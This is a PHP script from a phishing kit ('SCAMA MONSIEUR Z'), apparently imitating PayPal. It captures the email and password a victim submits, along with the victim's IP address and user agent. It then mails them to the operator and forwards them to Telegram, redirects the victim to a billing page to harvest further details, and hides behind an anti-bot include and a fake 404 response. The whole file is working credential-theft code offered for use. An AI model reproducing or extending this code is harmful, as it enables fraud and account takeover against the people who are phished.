<?php
/*
SCAMA MONSIEUR Z
BY CRUSIX
GET_LOGIN.PHP
*/
include('../ANTIBOTS/antibots.php');
session_start();
include('../mail.php');
include '../telegram.php';
if(isset($_POST['mail']))
{
	
$_SESSION['mail'] = $_POST['mail'];
$_SESSION['pass'] = $_POST['pass'];
$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

if(!empty($_SESSION['mail']) || !empty($_SESSION['pass']))
{

	if(strpos($_SESSION['mail'],"@"))
	{
$msg = "
📘 Email : ".$_SESSION['mail']."
🔑 Password : ".$_SESSION['pass']."


🎪 IP Adress : ".$_SESSION['ip']."
🌐 User Agent : ".$_SESSION['useragent']."
";
$subject = "=?utf-8?Q?=E2=8C=8A=F0=9F=92=88=E2=8C=89_LOG_PPL_-_?=".$_SESSION['ip']." - ".$_SESSION['mail'];
$fromsender = "From: =?utf-8?Q?=F0=9F=94=B4MONSIEUR_Z=F0=9F=94=B4?= <log@crusxlebg.com>";
mail($rezmail,$subject,$msg,$fromsender);
		telegram($msg);
$_SESSION['login'] = true;
header('Location: billing.php?'.uniqid());
}
else{
	header('Location: login.php?error=true');
}
}
else{
	header('Location: login.php?error=true');
}

}
else
{
die('HTTP/1.0 404 Not Found');
}

?>